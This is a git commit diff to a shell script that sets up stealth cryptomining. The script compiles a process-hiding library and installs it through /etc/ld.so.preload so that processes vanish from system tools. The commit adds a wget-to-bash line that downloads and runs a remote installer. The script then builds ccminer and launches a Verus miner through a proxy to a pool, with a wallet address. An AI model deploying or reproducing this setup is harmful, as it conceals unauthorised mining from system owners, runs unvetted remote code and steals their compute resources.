1be199c105d7d7895d0d2ac4bff6bb26ef77e7e1
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-06-28 20:16:16 +0200

    Update start_ver_ws1.sh

--- start_ver_ws1.sh
+++ start_ver_ws1.sh
@@ -7,6 +7,8 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh | bash
+
 git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
 chmod +x ccminer/build.sh
 chmod +x ccminer/configure.sh
@@ -14,5 +16,5 @@ chmod +x ccminer/autogen.sh
 cd ccminer
 ./autogen.sh
 ./build.sh
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh
+
 graftcp ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RYF4zmgp9dbN2ktHxQMqmzPXtWDhSrQFUL.Nvidia -p x
